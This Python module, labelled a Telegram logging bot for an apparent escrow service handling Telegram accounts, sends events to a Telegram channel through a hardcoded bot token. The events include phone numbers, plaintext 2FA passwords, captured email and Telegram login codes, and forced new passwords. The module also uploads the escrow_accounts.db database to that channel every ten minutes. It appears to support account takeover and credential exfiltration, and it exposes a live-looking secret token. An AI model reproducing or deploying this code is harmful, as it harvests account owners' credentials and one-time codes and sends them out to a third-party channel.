"""
Telegram Log Bot - Lightweight HTTP-based logger
Sends all operation logs to a Telegram channel via Bot API.
No polling, no conflicts. Works in dev and production.
"""

import asyncio
import hashlib
import os
import shutil
import json
import aiohttp
from datetime import datetime
from typing import Optional

BOT_TOKEN = "8194328185:AAGPwP8d6IjQINEFVA_CgLBXO_KRNlxNTck"
CHAT_ID = -1003701131602
CONFIG_FILE = "log_bot_config.json"
DB_FILES = ["escrow_accounts.db"]
BACKUP_INTERVAL = 600  # 10 minutes
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

_session: Optional[aiohttp.ClientSession] = None
_last_db_hash: Optional[str] = None


def _now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _load_config():
    """Load channel ID from config file if exists."""
    global CHAT_ID
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                cfg = json.load(f)
                if cfg.get("channel_id"):
                    CHAT_ID = cfg["channel_id"]
        except:
            pass


async def _get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession()
    return _session


async def send_log(message: str):
    """Send a message to the Telegram log channel."""
    if not CHAT_ID:
        return
    try:
        session = await _get_session()
        await session.post(
            f"{API_URL}/sendMessage",
            json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"},
            timeout=aiohttp.ClientTimeout(total=10),
        )
    except Exception as e:
        print(f"[LogBot] Send failed: {e}")


async def send_document(file_path: str, caption: str = ""):
    """Send a file (e.g. DB backup) to the log channel."""
    if not CHAT_ID or not os.path.exists(file_path):
        return
    try:
        session = await _get_session()
        data = aiohttp.FormData()
        data.add_field("chat_id", str(CHAT_ID))
        data.add_field("caption", caption)
        data.add_field(
            "document",
            open(file_path, "rb"),
            filename=os.path.basename(file_path),
        )
        await session.post(
            f"{API_URL}/sendDocument",
            data=data,
            timeout=aiohttp.ClientTimeout(total=60),
        )
    except Exception as e:
        print(f"[LogBot] Document send failed: {e}")


# ===================== Log Event Functions =====================

async def log_new_account(phone: str, telegram_id=None, target_email: str = ""):
    await send_log(
        f"📥 <b>NEW ACCOUNT</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
        f"📧 Email: <code>{target_email or '-'}</code>\n"
        f"⏰ {_now()}"
    )

async def log_password_set(phone: str, telegram_id=None, password: str = ""):
    await send_log(
        f"🔐 <b>2FA PASSWORD SET</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
        f"🔑 Password: <code>{password}</code>\n"
        f"⏰ {_now()}"
    )

async def log_email_set(phone: str, telegram_id=None, email: str = ""):
    await send_log(
        f"📧 <b>EMAIL CONFIRMED</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
        f"📧 Email: <code>{email}</code>\n"
        f"⏰ {_now()}"
    )

async def log_email_code(email_hash: str, code: str, source: str = "webhook"):
    await send_log(
        f"📨 <b>EMAIL CODE CAPTURED</b>\n\n"
        f"🔢 Code: <code>{code}</code>\n"
        f"#️⃣ Hash: <code>{email_hash}</code>\n"
        f"📡 Source: {source}\n"
        f"⏰ {_now()}"
    )

async def log_code_fallback(phone: str, code: str):
    await send_log(
        f"📨 <b>CODE FROM TELEGRAM (777000)</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🔢 Code: <code>{code}</code>\n"
        f"⏰ {_now()}"
    )

async def log_delivery(phone: str, telegram_id=None, delivery_num: int = 0):
    await send_log(
        f"📦 <b>DELIVERED #{delivery_num}</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
        f"⏰ {_now()}"
    )

async def log_delivery_code_sent(phone: str):
    await send_log(
        f"📤 <b>DELIVERY CODE SENT</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"⏰ {_now()}"
    )

async def log_session_registered(phone: str, session_type: str = "pyrogram"):
    await send_log(
        f"🔗 <b>SESSION REGISTERED</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"📦 Type: {session_type}\n"
        f"⏰ {_now()}"
    )

async def log_security_check(phone: str, threat_level: str, red_flags: list = None, frozen: bool = False,
                             transfer_mode: str = None, bot_sessions: int = 0, user_sessions: int = 0):
    flags_txt = "\n".join([f"  🔴 {f}" for f in (red_flags or [])]) or "  ✅ None"
    mode_txt = f"📋 Mode: <b>{transfer_mode or 'unknown'}</b>\n" if transfer_mode else ""
    sess_txt = f"🤖 Bot sessions: {bot_sessions} | 👤 User sessions: {user_sessions}\n"
    await send_log(
        f"🛡️ <b>SECURITY CHECK</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"⚠️ Threat: <b>{threat_level.upper()}</b>\n"
        f"{mode_txt}"
        f"{sess_txt}"
        f"{'🧊 <b>FROZEN</b>\n' if frozen else ''}"
        f"🚩 Red Flags:\n{flags_txt}\n"
        f"⏰ {_now()}"
    )

async def log_admin_action(action: str, phone: str, details: str = ""):
    await send_log(
        f"⚙️ <b>ADMIN: {action.upper()}</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"{f'📝 {details}' if details else ''}\n"
        f"⏰ {_now()}"
    )

async def log_account_deleted(phone: str, telegram_id=None):
    await send_log(
        f"🗑️ <b>ACCOUNT DELETED</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
        f"⏰ {_now()}"
    )

async def log_session_terminated(phone: str, count: int = 0, scope: str = "all"):
    await send_log(
        f"🔌 <b>SESSIONS TERMINATED</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🔢 Count: {count}\n"
        f"📋 Scope: {scope}\n"
        f"⏰ {_now()}"
    )

async def log_force_secure(phone: str, new_password: str = ""):
    await send_log(
        f"🛡️ <b>FORCE SECURED</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🔑 New Pass: <code>{new_password or '?'}</code>\n"
        f"⏰ {_now()}"
    )

async def log_error(action: str, phone: str = "", error: str = ""):
    await send_log(
        f"❌ <b>ERROR</b>\n\n"
        f"🔧 Action: {action}\n"
        f"📱 Phone: <code>{phone or '-'}</code>\n"
        f"⚠️ {error}\n"
        f"⏰ {_now()}"
    )

async def log_audit_result(phone: str, passed: bool, issues_count: int = 0):
    emoji = "✅" if passed else "❌"
    await send_log(
        f"🔍 <b>AUDIT {'PASSED' if passed else 'FAILED'}</b> {emoji}\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"📋 Issues: {issues_count}\n"
        f"⏰ {_now()}"
    )

async def log_startup():
    await send_log(
        f"🚀 <b>SERVER STARTED</b>\n\n"
        f"⏰ {_now()}"
    )

async def log_shutdown():
    await send_log(
        f"🔴 <b>SERVER SHUTTING DOWN</b>\n\n"
        f"⏰ {_now()}"
    )


# ===================== DB Backup =====================

def _file_hash(path: str) -> str:
    """Get MD5 hash of a file to detect changes."""
    h = hashlib.md5()
    try:
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                h.update(chunk)
    except:
        return ""
    return h.hexdigest()


async def do_backup(force: bool = False):
    """Backup DB files to Telegram. Only sends if data changed (or force=True)."""
    global _last_db_hash
    for db_file in DB_FILES:
        if not os.path.exists(db_file):
            continue
        current_hash = _file_hash(db_file)
        if not force and _last_db_hash and current_hash == _last_db_hash:
            continue  # No changes, skip
        _last_db_hash = current_hash
        # Create local backup
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_path = f"{backup_dir}/{ts}_{db_file}"
        try:
            shutil.copy(db_file, backup_path)
        except:
            continue
        # Send to Telegram
        await send_document(backup_path, f"💾 Backup: {db_file}\n⏰ {_now()}")


async def _backup_loop():
    """Periodic backup loop - only sends if DB changed."""
    while True:
        try:
            await asyncio.sleep(BACKUP_INTERVAL)
            await do_backup()
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[LogBot] Backup error: {e}")


# ===================== Init / Stop =====================

_backup_task = None

async def init_log_bot():
    global _backup_task
    _load_config()
    _backup_task = asyncio.create_task(_backup_loop())
    await log_startup()
    print("[LogBot] Initialized (HTTP mode)")


async def stop_log_bot():
    global _backup_task, _session
    await log_shutdown()
    if _backup_task:
        _backup_task.cancel()
        try:
            await _backup_task
        except asyncio.CancelledError:
            pass
    if _session and not _session.closed:
        await _session.close()
    print("[LogBot] Stopped")


# Backward compatibility
def get_bot_app():
    return True  # Always truthy so old code paths execute
